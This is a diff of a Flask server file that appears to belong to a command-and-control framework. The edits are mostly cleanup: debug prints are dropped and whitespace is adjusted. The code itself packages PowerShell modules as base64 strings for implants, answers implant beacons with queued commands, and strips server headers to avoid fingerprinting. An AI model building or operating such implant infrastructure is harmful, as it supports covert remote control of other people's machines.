@@ -1,4 +1,4 @@
-from flask import Flask, make_response, request
+from flask import Flask, request
 import base64
 from uuid import uuid4
 import os
@@ -19,8 +19,6 @@ def craft_sound_file(path):
 
     with open(path, 'rb') as file:
         audio = "PS".encode()+base64.b64encode(file.read())
-
-        # print(type(audio))
     return audio
 
 
@@ -56,13 +54,11 @@ def craft_load_module(value_dict):
         with open(str(os.getcwd()+"/Storage/implant_resources/modules/"+value_dict['args']+".ps1"), 'r') as fileh:
             to_encode = "{}::{}".format(value_dict['args'], fileh.read())
             load_module_string = "LM" + base64.b64encode(to_encode.encode()).decode()
-            print("Load module crafted successfully: {}".format(load_module_string))
             return load_module_string
     except Exception as e:
         # These exceptions should be added to a log file.
         print("Load module failed")
         pass
-
     return str("==")
 
 
@@ -74,6 +70,7 @@ def craft_invoke_module(value_dict):
 
 def craft_list_modules(value_dict):
     return str(value_dict['type'])
+
 
 #
 preprocessing = {
@@ -90,11 +87,11 @@ preprocessing = {
     }
 
 
-
 @app.before_request
 def before_request():
     # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
     return
+
 
 # Removing the Werkzeug header to reduce Fudges server fingerprinting.
 @app.after_request
@@ -118,7 +115,7 @@ def Stager():
 @app.route("/index", methods=["GET", "POST"])
 def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
-       return "=="
+        return "=="
     if request.method == "POST":
         next_cmd = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
         if next_cmd != "==":
@@ -126,7 +123,6 @@ def implant_beacon_endpoint():
             return processed_return_val
     # Need to remove the use of == in beacons: this is too fingerprintable.
     return "=="
-
 
 
 @app.route("/help", methods=['GET', 'POST'])
@@ -144,11 +140,11 @@ def ImplantCommandResult():
 @app.route("/nlaksnfaobcaowb", methods=['GET', 'POST'])
 def ShutdownListener():
     if request.remote_addr == "127.0.0.1":
-        print ("blah")
         shutdown_hook = request.environ.get('werkzeug.server.shutdown')
         if shutdown_hook is not None:
             shutdown_hook()
         # raise RuntimeError("Server going down")
+
 
 def shutdown():
     raise RuntimeError("Server going down")
